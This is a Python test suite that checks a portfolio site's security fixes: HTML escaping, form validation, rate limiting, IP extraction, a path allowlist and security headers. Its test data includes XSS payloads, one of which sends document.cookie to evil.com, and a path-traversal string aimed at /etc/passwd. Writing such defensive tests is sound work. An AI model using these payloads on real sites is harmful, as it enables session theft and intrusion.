"""
Portfolio Security Test Suite — Python runner
Mirrors all logic from run-tests.js but executable right now with Python.

Run:
    python __tests__/run-tests.py
"""

import re
import os
import sys

# ──────────────────────────────────────────────────────────────────────────────
# Tiny harness
# ──────────────────────────────────────────────────────────────────────────────

passed = 0
failed = 0
failures = []

def test(label, fn):
    global passed, failed
    try:
        fn()
        print(f"  ✅  {label}")
        passed += 1
    except AssertionError as e:
        print(f"  ❌  {label}")
        print(f"       → {e}")
        failed += 1
        failures.append({"label": label, "message": str(e)})

def describe(group):
    print(f"\n📋  {group}")

def expect(actual):
    class Matcher:
        def to_be(self, expected):
            assert actual == expected, f"Expected {repr(expected)}, got {repr(actual)}"
        def to_contain(self, substring):
            assert substring in str(actual), f'Expected {repr(actual)} to contain {repr(substring)}'
        def to_be_truthy(self):
            assert actual, f"Expected truthy, got {repr(actual)}"
        def to_be_falsy(self):
            assert not actual, f"Expected falsy, got {repr(actual)}"
        class _Not:
            def __init__(self, val):
                self.val = val
            def to_contain(self, substring):
                assert substring not in str(self.val), \
                    f'Expected {repr(self.val)} NOT to contain {repr(substring)}'
            def to_be(self, expected):
                assert self.val != expected, f"Expected NOT {repr(expected)}"
        @property
        def not_(self):
            return Matcher._Not(actual)
    return Matcher()

# ──────────────────────────────────────────────────────────────────────────────
# Functions under test (Python re-implementations of the TS/JS originals)
# ──────────────────────────────────────────────────────────────────────────────

def escape_html(unsafe: str) -> str:
    """Mirrors lib/email.ts escapeHtml()"""
    return (unsafe
        .replace("&",  "&amp;")
        .replace("<",  "&lt;")
        .replace(">",  "&gt;")
        .replace('"',  "&quot;")
        .replace("'",  "&#039;"))

def validate_contact_form(data: dict) -> dict:
    """Mirrors lib/validation.ts contactFormSchema"""
    errors = {}

    # name: string, 2–100 chars trimmed
    if not isinstance(data.get("name"), str):
        errors["name"] = "Name must be a string"
    else:
        name = data["name"].strip()
        if len(name) < 2:
            errors["name"] = "Name must be at least 2 characters"
        elif len(name) > 100:
            errors["name"] = "Name must be less than 100 characters"

    # email: valid format, trimmed, ≤255 chars
    if not isinstance(data.get("email"), str):
        errors["email"] = "Email must be a string"
    else:
        email = data["email"].strip()
        pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
        if not re.match(pattern, email):
            errors["email"] = "Please enter a valid email address"
        elif len(email) > 255:
            errors["email"] = "Email must be less than 255 characters"

    # subject: 5–200 chars trimmed
    if not isinstance(data.get("subject"), str):
        errors["subject"] = "Subject must be a string"
    else:
        subject = data["subject"].strip()
        if len(subject) < 5:
            errors["subject"] = "Subject must be at least 5 characters"
        elif len(subject) > 200:
            errors["subject"] = "Subject must be less than 200 characters"

    # message: 10–5000 chars trimmed
    if not isinstance(data.get("message"), str):
        errors["message"] = "Message must be a string"
    else:
        message = data["message"].strip()
        if len(message) < 10:
            errors["message"] = "Message must be at least 10 characters"
        elif len(message) > 5000:
            errors["message"] = "Message must be less than 5000 characters"

    return {"success": len(errors) == 0, "errors": errors}

def get_client_ip(headers: dict) -> str:
    """Mirrors app/api/email/route.ts getClientIp()"""
    forwarded = headers.get("x-forwarded-for")
    if forwarded:
        parts = [s.strip() for s in forwarded.split(",")]
        return parts[-1] if parts[-1] else "unknown"
    return headers.get("x-real-ip") or "unknown"

RATE_LIMIT = 5
RATE_LIMIT_WINDOW = 60 * 60 * 1000  # 1 hour in ms

def make_store():
    return {}

def check_rate_limit(store: dict, ip: str, now: int) -> bool:
    """Mirrors checkRateLimit() in email route"""
    record = store.get(ip)
    if not record or now > record["resetTime"]:
        store[ip] = {"count": 1, "resetTime": now + RATE_LIMIT_WINDOW}
        return True
    if record["count"] < RATE_LIMIT:
        record["count"] += 1
        return True
    return False

ALLOWED_PATHS = {"/", "/api/email"}

def is_allowed_path(path: str) -> bool:
    """Mirrors isAllowedPath() in revalidate route"""
    return path in ALLOWED_PATHS

# ──────────────────────────────────────────────────────────────────────────────
# Read source files for source-code checks
# ──────────────────────────────────────────────────────────────────────────────

base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def read_src(rel_path):
    full = os.path.join(base, rel_path)
    if os.path.exists(full):
        with open(full, encoding="utf-8") as f:
            return f.read()
    return ""

next_config_src   = read_src("next.config.js")
email_src         = read_src("lib/email.ts")
validation_src    = read_src("lib/validation.ts")
email_route_src   = read_src("app/api/email/route.ts")
revalidate_src    = read_src("app/api/revalidate/route.ts")

# ──────────────────────────────────────────────────────────────────────────────
# TEST SUITES
# ──────────────────────────────────────────────────────────────────────────────

import time
NOW = int(time.time() * 1000)

print("\n════════════════════════════════════════════════════")
print("  PORTFOLIO SECURITY TEST SUITE")
print("════════════════════════════════════════════════════")

# ── Suite 1: escapeHtml ──────────────────────────────────────────────────────

describe("escapeHtml() — XSS prevention in email template")

test("escapes < and > (angle brackets)", lambda:
    expect(escape_html("<script>")).to_be("&lt;script&gt;"))

test("escapes & (ampersand)", lambda:
    expect(escape_html("AT&T")).to_be("AT&amp;T"))

test('escapes " (double-quote)', lambda:
    expect(escape_html('"hello"')).to_be("&quot;hello&quot;"))

test("escapes ' (single-quote)", lambda:
    expect(escape_html("it's")).to_be("it&#039;s"))

test("leaves safe characters unchanged", lambda:
    expect(escape_html("Hello World 123")).to_be("Hello World 123"))

test("handles empty string", lambda:
    expect(escape_html("")).to_be(""))

def _test_xss_img():
    xss = '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">'
    escaped = escape_html(xss)
    expect(escaped).not_.to_contain("<")
    expect(escaped).not_.to_contain(">")
    expect(escaped).not_.to_contain('"')
    expect(escaped).to_contain("&lt;img")
test("neutralises img onerror XSS payload", _test_xss_img)

def _test_xss_script():
    xss = "<script>alert('xss')</script>"
    escaped = escape_html(xss)
    expect(escaped).not_.to_contain("<script>")
    expect(escaped).to_contain("&lt;script&gt;")
test("neutralises script tag XSS payload", _test_xss_script)

def _test_xss_event():
    xss = '" onmouseover="alert(1)'
    escaped = escape_html(xss)
    expect(escaped).not_.to_contain('"')
    expect(escaped).to_contain("&quot;")
test("neutralises event-handler injection", _test_xss_event)

test("handles unicode without corruption", lambda:
    expect(escape_html("Héllo café — ñoño")).to_be("Héllo café — ñoño"))

test("escapeHtml is called in email.ts source (fix verified)", lambda:
    expect(email_src).to_contain("escapeHtml(name)"))

test("escapeHtml is called on email in source", lambda:
    expect(email_src).to_contain("escapeHtml(email)"))

test("escapeHtml is called on subject in source", lambda:
    expect(email_src).to_contain("escapeHtml(subject)"))

test("escapeHtml is called on message in source", lambda:
    expect(email_src).to_contain("escapeHtml(message)"))

# ── Suite 2: Validation ──────────────────────────────────────────────────────

describe("Contact Form Validation — Zod schema rules")

valid = {
    "name": "John Doe",
    "email": "john@example.com",
    "subject": "Hello there",
    "message": "This is a valid message body.",
}

test("accepts a fully valid submission", lambda:
    expect(validate_contact_form(valid)["success"]).to_be(True))

test("trims whitespace from name", lambda:
    expect(validate_contact_form({**valid, "name": "  John  "})["success"]).to_be(True))

test("trims whitespace from email", lambda:
    expect(validate_contact_form({**valid, "email": "  john@example.com  "})["success"]).to_be(True))

test("rejects name shorter than 2 chars", lambda:
    expect(validate_contact_form({**valid, "name": "J"})["success"]).to_be(False))

test("rejects name longer than 100 chars", lambda:
    expect(validate_contact_form({**valid, "name": "J" * 101})["success"]).to_be(False))

test("accepts name exactly at minimum (2 chars)", lambda:
    expect(validate_contact_form({**valid, "name": "Jo"})["success"]).to_be(True))

test("rejects malformed email — no domain", lambda:
    expect(validate_contact_form({**valid, "email": "noatsign"})["success"]).to_be(False))

test("rejects malformed email — no TLD", lambda:
    expect(validate_contact_form({**valid, "email": "a@b"})["success"]).to_be(False))

test("rejects subject shorter than 5 chars", lambda:
    expect(validate_contact_form({**valid, "subject": "Hi"})["success"]).to_be(False))

test("rejects subject longer than 200 chars", lambda:
    expect(validate_contact_form({**valid, "subject": "S" * 201})["success"]).to_be(False))

test("rejects message shorter than 10 chars", lambda:
    expect(validate_contact_form({**valid, "message": "Short"})["success"]).to_be(False))

test("rejects message longer than 5000 chars", lambda:
    expect(validate_contact_form({**valid, "message": "M" * 5001})["success"]).to_be(False))

test("accepts message exactly at 5000 chars (boundary)", lambda:
    expect(validate_contact_form({**valid, "message": "M" * 5000})["success"]).to_be(True))

test("rejects empty object", lambda:
    expect(validate_contact_form({})["success"]).to_be(False))

test("rejects null name", lambda:
    expect(validate_contact_form({**valid, "name": None})["success"]).to_be(False))

test("validation.ts has .trim() on email field", lambda:
    expect(validation_src).to_contain(".trim()"))

# ── Suite 3: Rate Limiting ────────────────────────────────────────────────────

describe("Rate Limiting — checkRateLimit()")

def _test_first_request():
    store = make_store()
    assert check_rate_limit(store, "1.2.3.4", NOW) == True
test("allows first request", _test_first_request)

def _test_rate_limit_n():
    store = make_store()
    for _ in range(RATE_LIMIT):
        assert check_rate_limit(store, "1.2.3.4", NOW) == True
test(f"allows exactly {RATE_LIMIT} requests", _test_rate_limit_n)

def _test_blocks_nth():
    store = make_store()
    for _ in range(RATE_LIMIT):
        check_rate_limit(store, "1.2.3.4", NOW)
    assert check_rate_limit(store, "1.2.3.4", NOW) == False
test(f"blocks the {RATE_LIMIT + 1}th request", _test_blocks_nth)

def _test_ip_independent():
    store = make_store()
    for _ in range(RATE_LIMIT):
        check_rate_limit(store, "1.1.1.1", NOW)
    assert check_rate_limit(store, "1.1.1.1", NOW) == False
    assert check_rate_limit(store, "2.2.2.2", NOW) == True
test("different IPs are tracked independently", _test_ip_independent)

def _test_reset_after_window():
    store = make_store()
    for _ in range(RATE_LIMIT):
        check_rate_limit(store, "1.2.3.4", NOW)
    assert check_rate_limit(store, "1.2.3.4", NOW) == False
    after = NOW + RATE_LIMIT_WINDOW + 1
    assert check_rate_limit(store, "1.2.3.4", after) == True
test("counter resets after the window expires", _test_reset_after_window)

# ── Suite 4: IP Extraction ────────────────────────────────────────────────────

describe("IP Extraction — getClientIp() anti-spoofing")

test("reads LAST x-forwarded-for entry (anti-spoofing)", lambda:
    expect(get_client_ip({"x-forwarded-for": "1.2.3.4, 5.6.7.8, 99.99.99.99"})).to_be("99.99.99.99"))

test("handles single-entry x-forwarded-for", lambda:
    expect(get_client_ip({"x-forwarded-for": "10.0.0.1"})).to_be("10.0.0.1"))

test("trims spaces from entries", lambda:
    expect(get_client_ip({"x-forwarded-for": "  1.2.3.4  ,  5.6.7.8  "})).to_be("5.6.7.8"))

test("falls back to x-real-ip when x-forwarded-for absent", lambda:
    expect(get_client_ip({"x-forwarded-for": None, "x-real-ip": "10.20.30.40"})).to_be("10.20.30.40"))

test("returns 'unknown' when both headers absent", lambda:
    expect(get_client_ip({"x-forwarded-for": None, "x-real-ip": None})).to_be("unknown"))

def _test_no_first_entry():
    ip = get_client_ip({"x-forwarded-for": "SPOOFED.IP, 5.6.7.8, real.edge.ip"})
    assert ip != "SPOOFED.IP", f"Should not use first entry, got {ip}"
    assert ip == "real.edge.ip", f"Expected 'real.edge.ip', got {ip}"
test("does NOT use the first (client-spoofable) entry", _test_no_first_entry)

test("route source uses last entry (parts[parts.length-1])", lambda:
    expect(email_route_src).to_contain("parts[parts.length - 1]"))

# ── Suite 5: Path Allowlist ───────────────────────────────────────────────────

describe("Revalidate Path Allowlist — isAllowedPath()")

test("allows root /",              lambda: expect(is_allowed_path("/")).to_be(True))
test("allows /api/email",          lambda: expect(is_allowed_path("/api/email")).to_be(True))
test("rejects /admin",             lambda: expect(is_allowed_path("/admin")).to_be(False))
test("rejects path traversal",     lambda: expect(is_allowed_path("/../../../etc/passwd")).to_be(False))
test("rejects empty string",       lambda: expect(is_allowed_path("")).to_be(False))
test("rejects /api/revalidate",    lambda: expect(is_allowed_path("/api/revalidate")).to_be(False))
test("is case-sensitive",          lambda: expect(is_allowed_path("/API/EMAIL")).to_be(False))

# ── Suite 6: Source-code verification ────────────────────────────────────────

describe("Source Code Checks — verifying security fixes are in the files")

test("next.config.js has Content-Security-Policy", lambda:
    expect(next_config_src).to_contain("Content-Security-Policy"))

test("next.config.js has Strict-Transport-Security (HSTS)", lambda:
    expect(next_config_src).to_contain("Strict-Transport-Security"))

test("CSP contains frame-ancestors 'none'", lambda:
    expect(next_config_src).to_contain("frame-ancestors 'none'"))

test("CSP contains form-action 'self'", lambda:
    expect(next_config_src).to_contain("form-action 'self'"))

test("CSP allows Sanity CDN for images", lambda:
    expect(next_config_src).to_contain("cdn.sanity.io"))

test("next.config.js has X-Content-Type-Options", lambda:
    expect(next_config_src).to_contain("X-Content-Type-Options"))

test("next.config.js has X-Frame-Options", lambda:
    expect(next_config_src).to_contain("X-Frame-Options"))

test("next.config.js has X-XSS-Protection", lambda:
    expect(next_config_src).to_contain("X-XSS-Protection"))

test("next.config.js has Referrer-Policy", lambda:
    expect(next_config_src).to_contain("Referrer-Policy"))

test("next.config.js has Permissions-Policy", lambda:
    expect(next_config_src).to_contain("Permissions-Policy"))

test("email route returns generic 500 message (no internal leak)", lambda:
    expect(email_route_src).to_contain("An error occurred. Please try again later."))

test("old leaky 500 message is removed", lambda:
    expect(email_route_src).not_.to_contain("Failed to send email"))

test("email route guards Content-Type", lambda:
    expect(email_route_src).to_contain("application/json"))

test("email route uses last x-forwarded-for (anti-spoofing fix present)", lambda:
    expect(email_route_src).to_contain("parts[parts.length - 1]"))

test("revalidate route rejects GET with 405", lambda:
    expect(revalidate_src).to_contain("405"))

test("revalidate route has ALLOWED_PATHS allowlist", lambda:
    expect(revalidate_src).to_contain("ALLOWED_PATHS"))

test("revalidate route returns 401 on bad secret", lambda:
    expect(revalidate_src).to_contain("401"))

# ──────────────────────────────────────────────────────────────────────────────
# Summary
# ──────────────────────────────────────────────────────────────────────────────

print("\n════════════════════════════════════════════════════")
print("  RESULTS")
print("════════════════════════════════════════════════════")
print(f"  Total:   {passed + failed}")
print(f"  Passed:  {passed} ✅")
print(f"  Failed:  {failed} {'❌' if failed > 0 else '✅'}")

if failures:
    print("\n  FAILURES:")
    for f in failures:
        print(f"  ❌ {f['label']}")
        print(f"     {f['message']}")

print()

if failed > 0:
    sys.exit(1)
else:
    print("  All security tests passed. ✅")
    print("  Site is secure and ready for deployment.\n")
